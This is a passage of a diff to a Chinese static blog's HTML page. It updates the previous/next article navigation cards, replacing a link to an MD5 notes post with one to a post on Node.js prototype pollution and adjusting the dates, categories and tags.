-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2025/04/17/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
                     <div class="card-image">
@@ -780,9 +994,9 @@ console.log(o3.b)
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2025-04-17
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-04-17
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -795,6 +1009,7 @@ console.log(o3.b)
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -817,13 +1032,13 @@ console.log(o3.b)
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2025/04/16/md5/">
+                <a href="/2025/04/17/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
                     <div class="card-image">
                         
                         
-                        <img src="/img/loading.gif" data-original="/medias/featureimages/16.jpg" class="responsive-img" alt="md5整理">
+                        <img src="/img/loading.gif" data-original="/medias/featureimages/9.jpg" class="responsive-img" alt="nodejs原型链污染">
                         
-                        <span class="card-title">md5整理</span>
+                        <span class="card-title">nodejs原型链污染</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -834,14 +1049,14 @@ console.log(o3.b)
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-04-16
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-04-17
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E5%BD%92%E7%BA%B3%E6%95%B4%E7%90%86/" class="post-category">
-                                    归纳整理
+                            <a href="/categories/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="post-category">
+                                    原型链污染
                                 </a>
                             
                             
@@ -851,12 +1066,12 @@ console.log(o3.b)
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/md5%E6%AF%94%E8%BE%83/">
-                        <span class="chip bg-color">md5比较</span>
-                    </a>
-                    
                     <a href="/tags/Web/">
                         <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="/tags/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">
+                        <span class="chip bg-color">nodejs原型链污染</span>
                     </a>
                     
                 </div>
